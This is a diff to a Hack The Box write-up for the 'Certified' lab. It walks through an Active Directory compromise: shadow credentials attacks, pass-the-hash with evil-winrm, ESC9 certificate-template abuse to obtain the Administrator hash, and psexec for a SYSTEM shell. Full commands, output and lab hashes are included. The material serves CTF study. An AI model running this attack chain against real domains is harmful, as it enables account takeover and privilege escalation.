@@ -24,6 +24,8 @@ We start the box with some credentials.
 Lets start with a nmap scan
 
 ```terminal
+nmap 10.129.231.186 -sV -sC -p- -v -oN nmap.txt
+
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-27 02:29:46Z)
@@ -125,6 +127,8 @@ SMB         10.129.231.186  445    DC01             [+] certified.htb\:
 INFO: Done in 00M 32S
 ```
 
+### Management_svc
+
 ![Certified](c1.png)
 
 We see that we have a attack path from judith.mader -> MANAGEMENT_SVC
@@ -176,4 +180,315 @@ We see that we have as users in the Management group have GenericWrite over MANA
 
 At first I tried a kerberoast attack but I could not crack the hash. Instead we are going for a shadow credentials attack 
 
-Im going to finish writing this soon
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ sudo rdate -n 10.129.231.186
+Sat Aug 29 22:10:42 EDT 2026
+
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'management_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'd0adb041fcce4b54a179dcdf0bacc89e'
+[*] Adding Key Credential with device ID 'd0adb041fcce4b54a179dcdf0bacc89e' to the Key Credentials for 'management_svc'
+[*] Successfully added Key Credential with device ID 'd0adb041fcce4b54a179dcdf0bacc89e' to the Key Credentials for 'management_svc'
+[*] Authenticating as 'management_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'management_svc@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'management_svc.ccache'
+[*] Wrote credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Restoring the old Key Credentials for 'management_svc'
+[*] Successfully restored the old Key Credentials for 'management_svc'
+[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
+```
+
+error 1
+
+If you see for example this. Even thought it says it succeded check that your on the same time as kerberos. Also if it fails but your on just sync your time check if something is reverting your time sync.
+```terminal
+[*] NT hash for 'management_svc': None
+```
+
+error 2
+
+If you get this error just redo the steps before as the cron job reverted the change. If you rerun the commands it should work.
+
+```terminal
+[-] Could not update Key Credentials for 'management_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+```
+
+## User
+
+We got the hash for management_svc. We can check if it works. It does work. We also have permission over winrm (Pwn3d!) so, we can winrm and grab the user flag.
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ nxc smb 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
+SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.231.186  445    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 
+
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ nxc winrm 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
+WINRM       10.129.231.186  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) 
+WINRM       10.129.231.186  5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
+
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ evil-winrm -i 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\management_svc\Documents> cd ..
+*Evil-WinRM* PS C:\Users\management_svc> cd Desktop
+*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
+e06a3b08c18d1bddfc65efe688a16701
+```
+
+### Ca_operator
+
+We can check if we got some outbound control over something and we do.
+
+![Certified](c3.png)
+
+management_svc got GenericAll over ca_operator
+
+We can perform a orther shadow credential attack
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account CA_OPERATOR -target certified.htb -dc-ip 10.129.231.186
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_operator'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '5073024ec72f4979b204e990b7ac6b58'
+[*] Adding Key Credential with device ID '5073024ec72f4979b204e990b7ac6b58' to the Key Credentials for 'ca_operator'
+[*] Successfully added Key Credential with device ID '5073024ec72f4979b204e990b7ac6b58' to the Key Credentials for 'ca_operator'
+[*] Authenticating as 'ca_operator' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_operator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_operator.ccache'
+[*] Wrote credential cache to 'ca_operator.ccache'
+[*] Trying to retrieve NT hash for 'ca_operator'
+[*] Restoring the old Key Credentials for 'ca_operator'
+[*] Successfully restored the old Key Credentials for 'ca_operator'
+[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
+```
+
+Lets also verify that we have access as ca_operator
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ nxc smb 10.129.231.186 -u 'ca_operator' -H b4b86f45c6018f1b664f70805f45d8f2                                                                                                           
+SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.231.186  445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2 
+```
+
+### ES9
+
+It works. We dont have anything outbound in bloodhound. We can run certipy to try find anything vulnerable
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -stdout                                                                    
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
+[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : certified-DC01-CA
+    DNS Name                            : DC01.certified.htb
+    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
+    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
+    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
+    Certificate Validity End            : 2124-05-13 15:43:41+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : CERTIFIED.HTB\Administrators
+      Access Rights
+        ManageCa                        : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        ManageCertificates              : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Enroll                          : CERTIFIED.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CertifiedAuthentication
+    Display Name                        : Certified Authentication
+    Certificate Authorities             : certified-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+                                          NoSecurityExtension
+    Extended Key Usage                  : Server Authentication
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-05-13T15:48:52+00:00
+    Template Last Modified              : 2024-05-13T15:55:20+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\operator ca
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFIED.HTB\Administrator
+        Full Control Principals         : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
+    [!] Vulnerabilities
+      ESC9                              : Template has no security extension.
+    [*] Remarks
+      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+```terminal
+
+It flags ESC9 as vulnerable.
+
+[Link](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension "Link 1 for ESC9") 
+
+[Link](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7 "Link 2 for ESC9/ESC10")
+
+both these 2 links describes ESC9 pretty good. 
+
+### Administrator
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad account update -dc-ip 10.129.231.186 -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : Administrator
+[*] Successfully updated 'ca_operator'
+
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 5
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad account update -dc-ip 10.129.231.186 -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb                          
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_operator':
+    userPrincipalName                   : ca_operator@certified.htb
+[*] Successfully updated 'ca_operator'
+
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186                                                                             
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*] Using principal: 'administrator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
+```
+
+We got the hash for the administrator account. Lets confirm it works.
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ nxc smb 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
+SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.231.186  445    DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
+```
+
+![Certified](c4.jpg)
+
+## Root
+
+Lets grab the root flag. Instead of using winrm or nxc to get the root flag, im going to use psexec from impacket. Just to switch up habits.
+
+```terminal
+┌──(songbird㉿kali)-[~/Desktop/certified]
+└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 administrator@10.129.231.186
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.231.186.....
+[*] Found writable share ADMIN$
+[*] Uploading file bhxuchwc.exe
+[*] Opening SVCManager on 10.129.231.186.....
+[*] Creating service qNnq on 10.129.231.186.....
+[*] Starting service qNnq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.6414]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> type c:\Users\Administrator\Desktop\root.txt
+f5498f97c1245dd1405d6ce77c1d1984
+```
+
+Pwned!
